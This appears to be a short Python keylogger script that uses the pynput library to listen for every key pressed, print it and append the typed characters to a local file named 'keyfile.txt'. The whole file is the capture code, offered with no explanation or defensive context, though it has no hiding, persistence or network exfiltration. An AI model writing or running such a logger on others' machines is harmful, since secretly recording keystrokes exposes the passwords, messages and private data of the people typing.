from pynput import keyboard
import os

def keyPressed(key):
    print(str(key))
    with open('keyfile.txt', 'a+') as f:
        try:
            char = key.char
            f.write(char)

        except:
            print(" CHAR ERROR ")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()


